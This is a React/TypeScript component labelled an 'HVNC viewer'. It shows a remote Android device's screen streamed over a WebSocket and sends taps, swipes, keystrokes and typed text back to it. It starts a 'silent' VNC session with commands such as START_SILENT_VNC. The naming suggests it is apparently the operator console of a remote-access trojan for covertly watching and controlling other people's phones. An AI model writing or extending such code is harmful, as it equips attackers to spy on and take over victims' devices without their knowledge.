/**
 * DeviceScreen — HVNC viewer
 *
 * Frame decoding pipeline:
 *   WS binary → Uint8Array → Blob → createImageBitmap (async, off-thread) → canvas.drawImage
 *
 * createImageBitmap is significantly faster than new Image() + createObjectURL because:
 *   - Browser decodes JPEG asynchronously without blocking the main thread
 *   - No URL object lifecycle (create/revoke) overhead
 *   - Direct ImageBitmap can be drawn without a layout pass
 *
 * Touch → command latency: mouse/touch events are dispatched synchronously to
 * sendCommand, which writes directly to the WebSocket send buffer. No debounce,
 * no throttle on tap/click. Swipe detection threshold: 8px, 500ms for long press.
 */

import React, {
  useEffect, useRef, useCallback, useState, memo,
} from 'react';
import { useStore } from '../store/useStore';
import { sendCommand, subscribeDevice, unsubscribeDevice } from '../services/wsService';

interface Props { deviceId: string }

const DeviceScreen: React.FC<Props> = ({ deviceId }) => {
  const canvasRef    = useRef<HTMLCanvasElement>(null);
  const containerRef = useRef<HTMLDivElement>(null);
  const hvncFrame    = useStore((s) => s.hvncFrame);
  const hvnc         = useStore((s) => s.hvnc);
  const viewMode     = useStore((s) => s.viewMode);
  const setHvnc      = useStore((s) => s.setHvnc);
  const [fullscreen, setFullscreen] = useState(false);
  const pendingFrame = useRef<Uint8Array | null>(null);
  const decoding     = useRef(false);

  /* ── Subscribe / unsubscribe ─────────────────────────────── */
  useEffect(() => {
    subscribeDevice(deviceId);
    return () => {
      unsubscribeDevice(deviceId);
      sendCommand(deviceId, 'STOP_SILENT_VNC');
      setHvnc({ active: false });
    };
  }, [deviceId, setHvnc]);

  /* ── Frame decode pipeline ───────────────────────────────────
     We buffer the latest frame while decoding.
     If a new frame arrives before decode finishes, the in-flight
     frame is replaced — we always decode the freshest one.
     This matches how video works: skip stale frames, not buffer them.
  ─────────────────────────────────────────────────────────── */
  useEffect(() => {
    if (!hvncFrame) return;

    pendingFrame.current = hvncFrame;

    if (decoding.current) return;       // decoder will pick up latest on finish
    decodeAndDraw();
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [hvncFrame]);

  async function decodeAndDraw(): Promise<void> {
    decoding.current = true;  // set immediately — before any await boundary
    try {
      while (pendingFrame.current) {
        const frame = pendingFrame.current;
        pendingFrame.current = null;

        try {
          const blob = new Blob([frame as Uint8Array<ArrayBuffer>], { type: 'image/jpeg' });
          const bmp  = await createImageBitmap(blob);
          const canvas = canvasRef.current;
          if (canvas) {
            const ctx = canvas.getContext('2d');
            if (ctx) {
              if (canvas.width !== bmp.width || canvas.height !== bmp.height) {
                canvas.width  = bmp.width;
                canvas.height = bmp.height;
              }
              ctx.drawImage(bmp, 0, 0);
            }
          }
          bmp.close();
        } catch {
          // JPEG decode failed — skip frame, continue loop
        }
      }
    } finally {
      // Always release lock — even if an unexpected error escapes the inner catch
      decoding.current = false;
    }
  }

  /* ── Pointer → command ───────────────────────────────────── */
  const toCanvasCoords = useCallback(
    (clientX: number, clientY: number) => {
      const canvas = canvasRef.current;
      if (!canvas) return { x: 0, y: 0 };
      const r  = canvas.getBoundingClientRect();
      const sx = canvas.width  / r.width;
      const sy = canvas.height / r.height;
      return {
        x: Math.round((clientX - r.left) * sx),
        y: Math.round((clientY - r.top)  * sy),
      };
    },
    []
  );

  const pressRef = useRef<{ x: number; y: number; ts: number } | null>(null);

  const handlePointerDown = useCallback((e: React.PointerEvent) => {
    (e.currentTarget as HTMLElement).setPointerCapture(e.pointerId);
    const { x, y } = toCanvasCoords(e.clientX, e.clientY);
    pressRef.current = { x, y, ts: Date.now() };
  }, [toCanvasCoords]);

  const handlePointerUp = useCallback((e: React.PointerEvent) => {
    const start = pressRef.current;
    pressRef.current = null;
    if (!start) return;

    const { x, y } = toCanvasCoords(e.clientX, e.clientY);
    const dx      = x - start.x;
    const dy      = y - start.y;
    const dist    = Math.hypot(dx, dy);
    const elapsed = Date.now() - start.ts;

    if (dist < 8) {
      // Tap or long press
      sendCommand(deviceId,
        elapsed >= 500 ? 'LONG_PRESS' : 'TAP',
        { x: start.x, y: start.y }
      );
    } else {
      // Swipe
      sendCommand(deviceId, 'SWIPE', {
        x1: start.x, y1: start.y,
        x2: x,       y2: y,
        duration: Math.max(elapsed, 80),
      });
    }
  }, [deviceId, toCanvasCoords]);

  const handlePointerCancel = useCallback(() => {
    pressRef.current = null;
  }, []);

  /* ── Scroll → swipe ─────────────────────────────────────── */
  const handleWheel = useCallback((e: React.WheelEvent) => {
    const { x, y } = toCanvasCoords(e.clientX, e.clientY);
    const dy = e.deltaY > 0 ? -300 : 300;
    sendCommand(deviceId, 'SWIPE', {
      x1: x, y1: y,
      x2: x, y2: y + dy,
      duration: 200,
    });
  }, [deviceId, toCanvasCoords]);

  /* ── Keyboard passthrough ────────────────────────────────── */
  const handleKeyDown = useCallback((e: React.KeyboardEvent) => {
    // Prevent browser defaults (Backspace = back, Enter = submit, arrow = scroll)
    if (['Backspace','Enter','ArrowUp','ArrowDown','ArrowLeft','ArrowRight',' '].includes(e.key)) {
      e.preventDefault();
    }
    if (e.key === 'Backspace') { sendCommand(deviceId, 'KEY_EVENT', { keyCode: 67 }); return; }
    if (e.key === 'Enter')     { sendCommand(deviceId, 'KEY_EVENT', { keyCode: 66 }); return; }
    if (e.key === 'ArrowUp')   { sendCommand(deviceId, 'KEY_EVENT', { keyCode: 19 }); return; }
    if (e.key === 'ArrowDown') { sendCommand(deviceId, 'KEY_EVENT', { keyCode: 20 }); return; }
    if (e.key === 'ArrowLeft') { sendCommand(deviceId, 'KEY_EVENT', { keyCode: 21 }); return; }
    if (e.key === 'ArrowRight'){ sendCommand(deviceId, 'KEY_EVENT', { keyCode: 22 }); return; }
    if (e.key === ' ')         { sendCommand(deviceId, 'KEY_EVENT', { keyCode: 62 }); return; }
    if (e.key.length === 1)    { sendCommand(deviceId, 'TYPE', { text: e.key }); }
  }, [deviceId]);

  /* ── Fullscreen ──────────────────────────────────────────── */
  const toggleFullscreen = useCallback(async () => {
    const el = containerRef.current;
    if (!el) return;
    if (!document.fullscreenElement) {
      await el.requestFullscreen();
    } else {
      await document.exitFullscreen();
    }
  }, []);

  useEffect(() => {
    const handler = () => setFullscreen(!!document.fullscreenElement);
    document.addEventListener('fullscreenchange', handler);
    return () => document.removeEventListener('fullscreenchange', handler);
  }, []);

  /* ── VNC controls ────────────────────────────────────────── */
  const startVnc = () => {
    sendCommand(deviceId, 'START_SILENT_VNC');
    sendCommand(deviceId, 'SET_SILENT_VNC_QUALITY', { quality: hvnc.quality });
    setHvnc({ active: true, mode: 'silent' });
  };
  const stopVnc = () => {
    sendCommand(deviceId, 'STOP_SILENT_VNC');
    setHvnc({ active: false, fps: 0 });
  };

  const setQuality = (quality: number) => {
    setHvnc({ quality });
    if (hvnc.active) sendCommand(deviceId, 'SET_SILENT_VNC_QUALITY', { quality });
  };

  /* ── Layout aspect ───────────────────────────────────────── */
  const isPortrait = viewMode === 'android';

  return (
    <div
      ref={containerRef}
      tabIndex={0}
      onKeyDown={handleKeyDown}
      className={`relative flex flex-col bg-black rounded-lg overflow-hidden border border-slate-800 shadow-2xl outline-none focus-within:border-cyan-800
        ${fullscreen ? 'w-screen h-screen rounded-none' : 'w-full h-full'}`}
    >
      {/* ── Stream header ─────────────────────────────────── */}
      <div className="absolute top-0 left-0 right-0 z-20 flex items-center justify-between px-3 py-1.5 bg-gradient-to-b from-black/80 to-transparent pointer-events-none select-none">
        <div className="flex items-center gap-2">
          <span className={`w-1.5 h-1.5 rounded-full ${hvnc.active ? 'bg-green-400 animate-pulse' : 'bg-slate-600'}`} />
          <span className="text-[11px] font-mono text-white/50">
            {hvnc.active
              ? `${hvnc.fps} fps · ${(hvnc.bytesSent / 1024).toFixed(0)} KB`
              : 'IDLE'}
          </span>
        </div>
        <span className="text-[10px] font-mono text-white/25">{deviceId.slice(-8).toUpperCase()}</span>
      </div>

      {/* ── Canvas ────────────────────────────────────────── */}
      <div className={`flex-1 flex items-center justify-center bg-[#050507] overflow-hidden ${isPortrait ? 'aspect-[9/16]' : 'aspect-[16/9]'} max-h-full max-w-full`}>
        <canvas
          ref={canvasRef}
          onPointerDown={handlePointerDown}
          onPointerUp={handlePointerUp}
          onPointerCancel={handlePointerCancel}
          onWheel={handleWheel}
          className="w-full h-full cursor-crosshair select-none touch-none"
          style={{ imageRendering: 'crisp-edges' }}
        />

        {/* Overlay when stream not active */}
        {!hvnc.active && (
          <div className="absolute inset-0 flex flex-col items-center justify-center gap-3 bg-black/80 backdrop-blur-sm">
            <div className="w-14 h-14 rounded-full border border-slate-700 flex items-center justify-center">
              <svg className="w-7 h-7 text-slate-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
              </svg>
            </div>
            <p className="text-[11px] font-mono text-slate-500 tracking-widest">STREAM INACTIVE</p>
            <button onClick={startVnc} className="px-4 py-1.5 rounded bg-cyan-700 hover:bg-cyan-600 text-white text-xs font-mono transition-colors">
              START HVNC
            </button>
          </div>
        )}
      </div>

      {/* ── Bottom control bar ────────────────────────────── */}
      <div className="absolute bottom-0 left-0 right-0 z-20 flex items-center gap-2 px-2.5 py-2 bg-gradient-to-t from-black/90 to-transparent">
        {/* Nav buttons */}
        {[
          { cmd: 'BACK',    icon: '←' },
          { cmd: 'HOME',    icon: '⌂' },
          { cmd: 'RECENTS', icon: '⊞' },
        ].map(({ cmd, icon }) => (
          <button
            key={cmd}
            onClick={() => sendCommand(deviceId, cmd)}
            className="w-8 h-7 rounded bg-white/10 hover:bg-white/20 text-white/70 text-sm flex items-center justify-center transition-colors"
          >
            {icon}
          </button>
        ))}

        {/* Spacer */}
        <div className="flex-1" />

        {/* Quality */}
        <div className="flex items-center gap-1.5">
          <span className="text-[10px] font-mono text-white/30">Q</span>
          <input
            type="range" min={10} max={100} step={5}
            value={hvnc.quality}
            onChange={(e) => setQuality(Number(e.target.value))}
            className="w-16 accent-cyan-500 cursor-pointer"
          />
          <span className="text-[10px] font-mono text-white/40 w-5 text-right">{hvnc.quality}</span>
        </div>

        {/* Fullscreen */}
        <button
          onClick={toggleFullscreen}
          title={fullscreen ? 'Exit fullscreen' : 'Fullscreen'}
          className="w-7 h-7 rounded bg-white/10 hover:bg-white/20 text-white/50 hover:text-white text-xs flex items-center justify-center transition-colors"
        >
          {fullscreen ? '⊡' : '⛶'}
        </button>

        {/* Start / Stop */}
        <button
          onClick={hvnc.active ? stopVnc : startVnc}
          className={`px-3 h-7 rounded text-[11px] font-mono transition-colors ${
            hvnc.active
              ? 'bg-red-700 hover:bg-red-600 text-white'
              : 'bg-cyan-700 hover:bg-cyan-600 text-white'
          }`}
        >
          {hvnc.active ? 'STOP' : 'START'}
        </button>
      </div>
    </div>
  );
};

export default memo(DeviceScreen);
